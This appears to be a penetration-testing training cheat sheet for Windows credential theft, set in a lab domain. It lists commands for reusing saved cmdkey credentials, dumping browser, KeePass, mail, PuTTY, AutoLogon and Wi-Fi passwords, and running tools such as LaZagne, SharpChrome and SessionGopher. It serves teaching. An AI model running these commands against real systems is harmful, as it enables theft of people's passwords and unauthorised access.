There are many ways to steal credentials on a Windows system. Below are common techniques with simple explanations and the commands you can use.

### 1. Cmdkey Saved Credentials
Windows stores saved usernames and passwords for things like Remote Desktop connections.

List saved credentials:

```bash
cmdkey /list
```

Run a command as a saved user:

```bash
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

Example: Run PowerShell as that user:

```bash
runas /savecred /user:inlanefreight\bob "powershell.exe"
```

When connecting via RDP, the saved credentials are used automatically.

### 2. Browser Credentials (Chrome)
Users often save passwords in their browsers.

Extract saved Chrome passwords with SharpChrome:

```powershell
.\SharpChrome.exe logins /unprotect
```

This displays usernames and passwords saved in Chrome for the current user.

### 3. Password Managers (KeePass)
Password managers like KeePass store multiple passwords securely but can sometimes be cracked.

Extract KeePass hash from .kdbx file:

```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

Crack the hash with Hashcat (mode 13400 for KeePass):

```bash
hashcat -m 13400 keepass_hash.txt /path/to/rockyou.txt
```

If cracked, you get access to many stored passwords for important systems.

### 4. Searching Emails for Passwords
If you have access to a user's email inbox (Microsoft Exchange), you can search for passwords or credentials.

Example command with MailSniper:

```bash
MailSniper -search "password" -search "credential"
```

### 5. Extracting Credentials with LaZagne
LaZagne can extract stored passwords from many applications.

View help menu:

```powershell
.\lazagne.exe -h
```

Run all modules to extract any saved credentials:

```powershell
.\lazagne.exe all
```

This attempts to find and display cleartext passwords saved by browsers, chat clients, databases, and more.

### 6. Extract Remote Access Credentials with SessionGopher
SessionGopher finds saved login info for remote tools like PuTTY, WinSCP, and RDP.

Import the module in PowerShell:

```powershell
Import-Module .\SessionGopher.ps1
```

Run it against a target host:

```powershell
Invoke-SessionGopher -Target WINLPE-SRV01
```

You’ll get decrypted saved session info like usernames and passwords.

### 7. Cleartext Passwords in Registry - Windows AutoLogon
Windows AutoLogon stores username and password in the registry for automatic login.

Check AutoLogon registry keys:

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for:

AutoAdminLogon (1 means enabled)

DefaultUserName (username)

DefaultPassword (password in cleartext)

Note: Using Autologon.exe from Sysinternals encrypts the password and is safer.

### 8. PuTTY Sessions Stored in Registry
PuTTY saves session info including proxy credentials in the registry.

List saved PuTTY sessions:

```bash
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

View specific session details:

```bash
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions<SESSION_NAME>"
```

Look for ProxyUsername and ProxyPassword which may be stored in cleartext.

### 9. Wi-Fi Passwords
If you have admin access on a Windows machine with Wi-Fi, you can list saved wireless networks and their passwords.

List saved Wi-Fi profiles:

```bash
netsh wlan show profile
```

Show details and password of a profile:

```bash
netsh wlan show profile <profile-name> key=clear
```

The password will appear under Key Content.

